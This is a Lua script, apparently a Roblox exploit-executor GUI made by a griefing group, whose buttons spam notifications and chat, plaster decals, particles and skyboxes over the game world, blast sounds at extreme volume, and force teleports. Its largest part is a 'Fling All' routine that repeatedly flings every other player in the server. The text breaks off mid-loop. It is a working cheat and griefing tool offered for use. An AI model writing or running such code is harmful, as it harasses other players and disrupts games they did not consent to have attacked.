-- Gui to Lua
-- Version: 3.
-- Instances:


local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Credits = Instance.new("TextButton")
local CREDITS = Instance.new("TextButton")
local Name = Instance.new("TextLabel")
local AR = Instance.new("TextButton")
local DS = Instance.new("TextButton")
local ARS = Instance.new("TextButton")
local DSS = Instance.new("TextButton")
local ars = Instance.new("TextButton")
local dss = Instance.new("TextButton")
local e1x1x1x1Laugh = Instance.new("TextButton")
local e1x1x1x1Laughs = Instance.new("TextButton")
local e1x1x1x1laughs = Instance.new("TextButton")
local DayToNight = Instance.new("TextButton")
local DayToNights = Instance.new("TextButton")
local daytonights = Instance.new("TextButton")
local e666 = Instance.new("TextButton")
local a666 = Instance.new("TextButton")
local f666 = Instance.new("TextButton")
local EpicSaxGuy = Instance.new("TextButton")
local EpicSaxGuys = Instance.new("TextButton")
local Disc0 = Instance.new("TextButton")
local Disc0s = Instance.new("TextButton")
local e2006Theme = Instance.new("TextButton")
local e2006Themes = Instance.new("TextButton")
local E2006THEMES = Instance.new("TextButton")
local ForceField = Instance.new("TextButton")
local ForceFields = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 0.447
Frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 3
Frame.Position = UDim2.new(0.382171214, 0, 0.328530252, 0)
Frame.Size = UDim2.new(0, 378, 0, 250)

Credits.Name = "Credits"
Credits.Parent = Frame
Credits.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
Credits.BorderColor3 = Color3.fromRGB(255, 255, 255)
Credits.BorderSizePixel = 3
Credits.Position = UDim2.new(0, 0, 0.912, 0)
Credits.Size = UDim2.new(0, 378, 0, 22)
Credits.Font = Enum.Font.GothamBold
Credits.Text = "MUSIC"
Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextWrapped = true
Credits.MouseButton1Down:connect(function()
ars.Visible = true
dss.Visible = true
daytonights.Visible = true
e1x1x1x1laughs.Visible = true
CREDITS.Visible = true
Credits.Visible = false
DayToNight.Visible = false
e1x1x1x1Laugh.Visible = false
DS.Visible = false
AR.Visible = false
ForceField.Visible = false
e2006Theme.Visible = false
Disc0.Visible = false
EpicSaxGuy.Visible = false
e666.Visible = false
wait(0.2)
end)
CREDITS.Name = "Credits"
CREDITS.Parent = Frame
CREDITS.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
CREDITS.Visible = false
CREDITS.BorderColor3 = Color3.fromRGB(255, 255, 255)
CREDITS.BorderSizePixel = 3
CREDITS.Position = UDim2.new(0, 0, 0.912, 0)
CREDITS.Size = UDim2.new(0, 378, 0, 22)
CREDITS.Font = Enum.Font.GothamBold
CREDITS.Text = "BACK"
CREDITS.TextColor3 = Color3.fromRGB(0, 0, 0)
CREDITS.TextScaled = true
CREDITS.TextSize = 14.000
CREDITS.TextWrapped = true
CREDITS.MouseButton1Down:connect(function()
ars.Visible = false
dss.Visible = false
CREDITS.Visible = false
daytonights.Visible = false
e1x1x1x1laughs.Visible = false
Credits.Visible = true
DayToNight.Visible = true
e1x1x1x1Laugh.Visible = true
DS.Visible = true
AR.Visible = true
ForceField.Visible = true
e2006Theme.Visible = true
Disc0.Visible = true
EpicSaxGuy.Visible = true
e666.Visible = true
wait(0.2)
end)
local upd = 2.74
Name.Name = "Name"
Name.Parent = Frame
Name.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Name.BackgroundTransparency = 1.000
Name.Size = UDim2.new(0, 378, 0, 25)
Name.Font = Enum.Font.GothamBold
Name.Text = "SHOWðCASE"..upd
Name.TextColor3 = Color3.fromRGB(0, 0, 0)
Name.TextScaled = true
Name.TextSize = 14.000
Name.TextWrapped = true

AR.Name = "autoreport"
AR.Parent = Frame
AR.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
AR.BorderColor3 = Color3.fromRGB(255, 255, 255)
AR.BorderSizePixel = 3
AR.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
AR.Size = UDim2.new(0, 79, 0, 31)
AR.Font = Enum.Font.GothamBold
AR.Text = "NOTIFICATION"
AR.TextColor3 = Color3.fromRGB(0, 0, 0)
AR.TextScaled = true
AR.TextSize = 14.000
AR.TextWrapped = true
AR.MouseButton1Down:connect(function()
while true do 
game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "team JKLO",
        Text = "JOIN TEAM JKLO TODAY!",
        Icon = "http://www.roblox.com/asset/?id=15651176489",
        Callback = Function
    })
    wait(1)
end
end)
DS.Name = "decalspam"
DS.Parent = Frame
DS.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
DS.BorderColor3 = Color3.fromRGB(255, 255, 255)
DS.BorderSizePixel = 3
DS.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
DS.Size = UDim2.new(0, 79, 0, 31)
DS.Font = Enum.Font.GothamBold
DS.Text = "realify"
DS.TextColor3 = Color3.fromRGB(0, 0, 0)
DS.TextScaled = true
DS.TextSize = 14.000
DS.TextWrapped = true
DS.MouseButton1Down:connect(function()
local ID = 15630705973
local particle = true

-- Donât change anything down below if you donât know what are you doing [This script made by cXyzkidd]

if particle == true then
	for i,v in pairs (game.Workspace:GetChildren()) do
		if v:IsA("Part") then
			local particle = Instance.new("ParticleEmitter")
			particle.Texture = "http://www.roblox.com/asset/?id=" ..ID
			particle.Parent = v
			particle.Rate = 200
			for i,x in pairs (game.Workspace:GetChildren()) do
				if x:IsA("Model") then
					for i,z in pairs (x:GetChildren()) do
						if z:IsA("Part") then
							local particle2 = Instance.new("ParticleEmitter")
							particle2.Texture = "http://www.roblox.com/asset/?id=" ..ID
							particle2.Parent = z
							particle2.Rate = 200
						end
					end
				end
			end
		end
	end
end
wait()
sky = Instance.new("Sky",game:GetService("Lighting"))
sky.SkyboxBk = "http://www.roblox.com/asset/?id=15630705973"
sky.SkyboxFt = "http://www.roblox.com/asset/?id=15630705973"
sky.SkyboxLf = "http://www.roblox.com/asset/?id=15630705973"
sky.SkyboxRt = "http://www.roblox.com/asset/?id=15630705973"
sky.SkyboxUp = "http://www.roblox.com/asset/?id=15630705973"
wait()
local ID = 11379488396 --id here
function spamDecal(v)
	if v:IsA("Part") then
		for i = 0, 5 do
			D = Instance.new("Decal")
			D.Name = "k00pz_decal_1"
			D.Face = i
			D.Parent = v
			D.Texture = ("http://www.roblox.com/asset/?id="..Id)
		end
	else
		if v:IsA("Model") then
			for a,b in pairs(v:GetChildren()) do
				spamDecal(b)
			end
		end
	end
end
function decalspam(id) --use this function, not the one on top
	Id = id
	for i,v in pairs(game.Workspace:GetChildren()) do
		if v:IsA("Part") then
			for i= 0, 5 do
				D = Instance.new("Decal")
				D.Name = "k00pz_decal_2"
				D.Face = i
				D.Parent = v
				D.Texture = ("http://www.roblox.com/asset/?id="..id)
			end
		else
			if v:IsA("Model") then
				for a,b in pairs(v:GetChildren()) do
					spamDecal(b)
				end
			end
		end
	end
end
end)
ARS.Name = "autoreport"
ARS.Parent = Frame
ARS.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
ARS.BorderColor3 = Color3.fromRGB(255, 255, 255)
ARS.BorderSizePixel = 3
ARS.Visible = false
ARS.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
ARS.Size = UDim2.new(0, 79, 0, 31)
ARS.Font = Enum.Font.GothamBold
ARS.Text = "JKLO PARTICLES"
ARS.TextColor3 = Color3.fromRGB(0, 0, 0)
ARS.TextScaled = true
ARS.TextSize = 14.000
ARS.TextWrapped = true
ARS.MouseButton1Down:connect(function()
local ID = 15511150536 -- Change your ID here fellas cXz (Image ID)
 local particle = true

-- Donât change anything down below if you donât know what are you doing [This script made by cXyzkidd]

if particle == true then
	for i,v in pairs (game.Workspace:GetChildren()) do
		if v:IsA("Part") then
			local particle = Instance.new("ParticleEmitter")
			particle.Texture = "http://www.roblox.com/asset/?id=" ..ID
			particle.Parent = v
			particle.Rate = 200
			for i,x in pairs (game.Workspace:GetChildren()) do
				if x:IsA("Model") then
					for i,z in pairs (x:GetChildren()) do
						if z:IsA("Part") then
							local particle2 = Instance.new("ParticleEmitter")
							particle2.Texture = "http://www.roblox.com/asset/?id=" ..ID
							particle2.Parent = z
							particle2.Rate = 200
						end
					end
				end
			end
		end
	end
end
end)
DSS.Name = "decalspam"
DSS.Parent = Frame
DSS.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
DSS.BorderColor3 = Color3.fromRGB(255, 255, 255)
DSS.BorderSizePixel = 3
DSS.Visible = false
DSS.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
DSS.Size = UDim2.new(0, 79, 0, 31)
DSS.Font = Enum.Font.GothamBold
DSS.Text = "b00sjkidd REALM"
DSS.TextColor3 = Color3.fromRGB(0, 0, 0)
DSS.TextScaled = true
DSS.TextSize = 14.000
DSS.TextWrapped = true
DSS.MouseButton1Down:connect(function()
--Made by JO1TAR0
local ICC = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local LoadingFrame = Instance.new("Frame")
local Frame = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local PercentageBar = Instance.new("ImageLabel")
local Label = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local ScreenGui = Instance.new("ScreenGui")
local ImageLabel_2 = Instance.new("ImageLabel")

--Properties:

ICC.Name = "ICC"
ICC.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ICC.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ICC.ResetOnSpawn = true

ImageLabel.Parent = ICC
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=15032057838"

LoadingFrame.Name = "LoadingFrame"
LoadingFrame.Parent = ImageLabel
LoadingFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
LoadingFrame.BorderSizePixel = 0
LoadingFrame.Position = UDim2.new(-0.000821621623, 0, 0.814750969, 0)
LoadingFrame.Size = UDim2.new(0.338442117, 0, 0.19506079, 0)

Frame.Name = "Frame"
Frame.Parent = LoadingFrame
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(-0.204075292, 0, -0.198473275, 0)
Frame.Size = UDim2.new(0.525885582, 0, 0.368852466, 0)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(35, 35, 35)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.383419693, 0, 0, 0)
TextLabel.Size = UDim2.new(0.616580307, 0, 0.577777803, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Loading..."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

PercentageBar.Name = "PercentageBar"
PercentageBar.Parent = LoadingFrame
PercentageBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PercentageBar.BackgroundTransparency = 1.000
PercentageBar.Position = UDim2.new(0.0326975472, 0, 0.577336967, 0)
PercentageBar.Size = UDim2.new(0.934604824, 0, 0.295081973, 0)
PercentageBar.Image = "rbxassetid://3570695787"
PercentageBar.ImageColor3 = Color3.fromRGB(255, 0, 0)
PercentageBar.ScaleType = Enum.ScaleType.Slice
PercentageBar.SliceCenter = Rect.new(100, 100, 100, 100)
PercentageBar.SliceScale = 0.120

Label.Name = "Label"
Label.Parent = PercentageBar
Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1.000
Label.Size = UDim2.new(1, 0, 1, 0)
Label.Font = Enum.Font.SourceSans
Label.Text = "100%"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextScaled = true
Label.TextSize = 14.000
Label.TextWrapped = true

TextLabel_2.Parent = ImageLabel
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(-0.00198846636, 0, 0.846784174, 0)
TextLabel_2.Size = UDim2.new(0.339608967, 0, 0.0428137034, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Now joining b00sjkidd realm.."
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = ImageLabel
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.0562912859, 0, 0.899411678, 0)
TextLabel_3.Size = UDim2.new(0.223557532, 0, 0.0245394632, 0)
TextLabel_3.Font = Enum.Font.SourceSansItalic
TextLabel_3.Text = "A place of pure homeless joy.."
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 2147483647
ScreenGui.ResetOnSpawn = true

ImageLabel_2.Parent = ScreenGui
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.Size = UDim2.new(1, 0, 1, 0)
ImageLabel_2.Visible = false
ImageLabel_2.Image = "http://www.roblox.com/asset/?id=9018233362"
game:GetService("TeleportService"):Teleport(12476784915)
wait()
k00p = Instance.new("Sound", game.Workspace)
		k00p.Name = "k00p's Sound"
		k00p.SoundId = "rbxassetid://1847661821"
		k00p.Volume = 9e9
        k00p.Pitch = 0.85
		k00p:Play()
end)
ars.Name = "autoreport"
ars.Parent = Frame
ars.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
ars.Visible = false
ars.BorderColor3 = Color3.fromRGB(255, 255, 255)
ars.BorderSizePixel = 3
ars.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
ars.Size = UDim2.new(0, 79, 0, 31)
ars.Font = Enum.Font.GothamBold
ars.Text = "c00l music"
ars.TextColor3 = Color3.fromRGB(0, 0, 0)
ars.TextScaled = true
ars.TextSize = 14.000
ars.TextWrapped = true
ars.MouseButton1Down:connect(function()
Spooky = Instance.new("Sound", game.Workspace)
		Spooky.Name = "Spooky"
		Spooky.SoundId = "rbxassetid://6942391979"
		Spooky.Volume = 6e9
                Spooky.Pitch = 1.1
		Spooky.Looped = true
		Spooky:Play()
end)
dss.Name = "decalspam"
dss.Parent = Frame
dss.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
dss.BorderColor3 = Color3.fromRGB(255, 255, 255)
dss.BorderSizePixel = 3
dss.Visible = false
dss.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
dss.Size = UDim2.new(0, 79, 0, 31)
dss.Font = Enum.Font.GothamBold
dss.Text = "DIP MUDIC"
dss.TextColor3 = Color3.fromRGB(0, 0, 0)
dss.TextScaled = true
dss.TextSize = 14.000
dss.TextWrapped = true
dss.MouseButton1Down:connect(function()
Spooky = Instance.new("Sound", game.Workspace)
		Spooky.Name = "real's theme"
		Spooky.SoundId = "rbxassetid://6695430066"
		Spooky.Volume = 6e9
                Spooky.Pitch = 1.1
		Spooky.Looped = true
		Spooky:Play()
end)
e1x1x1x1Laugh.Name = "e1x1x1x1Laugh"
e1x1x1x1Laugh.Parent = Frame
e1x1x1x1Laugh.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
e1x1x1x1Laugh.BorderColor3 = Color3.fromRGB(255, 255, 255)
e1x1x1x1Laugh.BorderSizePixel = 3
e1x1x1x1Laugh.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
e1x1x1x1Laugh.Size = UDim2.new(0, 79, 0, 34)
e1x1x1x1Laugh.Font = Enum.Font.GothamBold
e1x1x1x1Laugh.Text = "Disco"
e1x1x1x1Laugh.TextColor3 = Color3.fromRGB(0, 0, 0)
e1x1x1x1Laugh.TextScaled = true
e1x1x1x1Laugh.TextSize = 14.000
e1x1x1x1Laugh.TextWrapped = true
e1x1x1x1Laugh.MouseButton1Down:connect(function()
	--Made by Servano

 local Lighting = game:GetService("Lighting")
		local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
	
		function zigzag(X) 
			return math.acos(math.cos(X*math.pi))/math.pi
		end
	
		Counter = 0
	
		while wait(0.1) do 
			ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
			Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
			Counter += 0.01
		end
end)
e1x1x1x1Laughs.Name = "e1x1x1x1Laugh"
e1x1x1x1Laughs.Parent = Frame
e1x1x1x1Laughs.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
e1x1x1x1Laughs.BorderColor3 = Color3.fromRGB(255, 255, 255)
e1x1x1x1Laughs.BorderSizePixel = 3
e1x1x1x1Laughs.Visible = false
e1x1x1x1Laughs.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
e1x1x1x1Laughs.Size = UDim2.new(0, 79, 0, 34)
e1x1x1x1Laughs.Font = Enum.Font.GothamBold
e1x1x1x1Laughs.Text = "ChatSpam"
e1x1x1x1Laughs.TextColor3 = Color3.fromRGB(0, 0, 0)
e1x1x1x1Laughs.TextScaled = true
e1x1x1x1Laughs.TextSize = 14.000
e1x1x1x1Laughs.TextWrapped = true
e1x1x1x1Laughs.MouseButton1Down:connect(function()
for i,v in pairs(game.Players:GetChildren()) do 
game:GetService("Chat"):Chat(v.Character.Head,"TEAM JKLO JOIN TODAY!") 
end
end)
e1x1x1x1laughs.Name = "e1x1x1x1Laugh"
e1x1x1x1laughs.Parent = Frame
e1x1x1x1laughs.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
e1x1x1x1laughs.BorderColor3 = Color3.fromRGB(255, 255, 255)
e1x1x1x1laughs.BorderSizePixel = 3
e1x1x1x1laughs.Visible = false
e1x1x1x1laughs.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
e1x1x1x1laughs.Size = UDim2.new(0, 79, 0, 34)
e1x1x1x1laughs.Font = Enum.Font.GothamBold
e1x1x1x1laughs.Text = "STOP"
e1x1x1x1laughs.TextColor3 = Color3.fromRGB(0, 0, 0)
e1x1x1x1laughs.TextScaled = true
e1x1x1x1laughs.TextSize = 14.000
e1x1x1x1laughs.TextWrapped = true
e1x1x1x1laughs.MouseButton1Down:connect(function()
    for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then
            v.Playing = false
        end
    end
end)
DayToNight.Name = "DayToNight"
DayToNight.Parent = Frame
DayToNight.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
DayToNight.BorderColor3 = Color3.fromRGB(255, 255, 255)
DayToNight.BorderSizePixel = 3
DayToNight.Position = UDim2.new(0.388888896, 0, 0.216000006, 0)
DayToNight.Size = UDim2.new(0, 83, 0, 31)
DayToNight.Font = Enum.Font.GothamBold
DayToNight.Text = "Fling All"
DayToNight.TextColor3 = Color3.fromRGB(0, 0, 0)
DayToNight.TextScaled = true
DayToNight.TextSize = 14.000
DayToNight.TextWrapped = true
DayToNight.MouseButton1Down:connect(function()
	while true do 
local Targets = {"All"} -- "All", "Target Name", "Boss_JKLO_was_here"

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local AllBool = false

local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end

local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end

local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart

    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle

    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end

    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
        
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
        
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
        
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Occurred", "Random error", 5)
    end
end

if not Welcome then Message("Hacker Here!", "Enjoy!", 5) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end

if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end

for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 1414978355 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("Finished", "Username Invalid", 5)
    end
end
		wait(0.5)
	end
end)
DayToNights.Name = "DayToNight"
DayToNights.Parent = Frame
DayToNights.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
DayToNights.BorderColor3 = Color3.fromRGB(255, 255, 255)
DayToNights.BorderSizePixel = 3
DayToNights.Visible = false
DayToNights.Position = UDim2.new(0.388888896, 0, 0.216000006, 0)
DayToNights.Size = UDim2.new(0, 83, 0, 31)
DayToNights.Font = Enum.Font.GothamBold
DayToNights.Text = "k00pz SkyBox"
DayToNights.TextColor3 = Color3.fromRGB(0, 0, 0)
DayToNights.TextScaled = true
DayToNights.TextSize = 14.000
DayToNights.TextWrapped = true
DayToNights.MouseButton1Down:connect(function()
imageOne = "http://www.roblox.com/asset/?id=9422866248"
imageTwo = "http://www.roblox.com/asset/?id=11588317701"
imageThree = "http://www.roblox.com/asset/?id=9422866248"
imageFour = "http://www.roblox.com/asset/?id=11588317701"
imageFive = "http://www.roblox.com/asset/?id=9422866248"
imageSix = "http://www.roblox.com/asset/?id=11588317701"
imageSeven = "http://www.roblox.com/asset/?id=9422866248"
imageEight = "http://www.roblox.com/asset/?id=11588317701"

Sky = Instance.new("Sky", game.Lighting)
Sky.SkyboxBk = imageOne
Sky.SkyboxDn = imageOne
Sky.SkyboxFt = imageOne
Sky.SkyboxLf = imageOne
Sky.SkyboxRt = imageOne
Sky.SkyboxUp = imageOne

while true do
    Sky.SkyboxBk = imageOne
    Sky.SkyboxDn = imageOne
    Sky.SkyboxFt = imageOne
    Sky.SkyboxLf = imageOne
    Sky.SkyboxRt = imageOne
    Sky.SkyboxUp = imageOne
    wait(0.25)
    Sky.SkyboxBk = imageTwo
    Sky.SkyboxDn = imageTwo
    Sky.SkyboxFt = imageTwo
    Sky.SkyboxLf = imageTwo
    Sky.SkyboxRt = imageTwo
    Sky.SkyboxUp = imageTwo
    wait(0.25)
    Sky.SkyboxBk = imageThree
    Sky.SkyboxDn = imageThree
    Sky.SkyboxFt = imageThree
    Sky.SkyboxLf = imageThree
    Sky.SkyboxRt = imageThree
    Sky.SkyboxUp = imageThree
    wait(0.25)
    Sky.SkyboxBk = imageFour
    Sky.SkyboxDn = imageFour
